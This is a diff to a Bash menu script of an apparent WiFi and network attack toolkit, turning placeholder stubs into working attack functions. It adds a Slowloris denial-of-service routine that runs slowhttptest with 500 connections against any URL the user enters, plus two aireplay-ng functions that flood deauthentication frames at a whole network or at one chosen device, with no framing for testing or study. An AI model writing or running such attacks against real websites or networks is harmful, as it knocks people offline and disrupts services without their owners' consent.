@@ -3,7 +3,8 @@ source "lib/capture-handshake.sh"
 source "lib/crack-pmkid.sh"
 source "lib/crack-handshake.sh"
 source "lib/capture-packets.sh"
-
+source "lib/deauth-network.sh"
+source "lib/deauth-device.sh"
 
 capture-pmkid() {
     network-scan-1
@@ -226,14 +227,39 @@ ddos-ip() {
     read -n 1 -r -s -p "Press any key to continue..."
     main-menu
 }
-ddos-website() {
-    coming-soon
+slowloris-attack() {
+    clear
+    figlet Slow Loris Attack
+    echo "------------------- Slow down a website with http requests -------------------"
+    echo ""
+    read -p "Enter target URL: " URL
+    echo ""
+    if [ -z $URL ]
+    then
+    echo "Cannot leave blank"
+    sleep 2
+    slowloris-attack
+    else
+    slowhttptest -c 500 -H -i 10 -r 200 -t GET -u $URL -x 24 -p 2
+    fi
+    clear
+    main-menu
+    
 }
 deauth-network() {
-    coming-soon
+    network-scan-4
+    clear
+    aireplay-ng -0 0 -a $BSSID4 $INTERFACE
+    main-menu
+
 }
 deauth-device() {
-    coming-soon
+    network-scan-5
+    device-scan
+    choose-device
+    clear
+    aireplay-ng --deauth 0 -a $BSSID5 -c $CHOSEN_DEVICE $INTERFACE
+    main-menu
 }
 router-sploit() {
     coming-soon
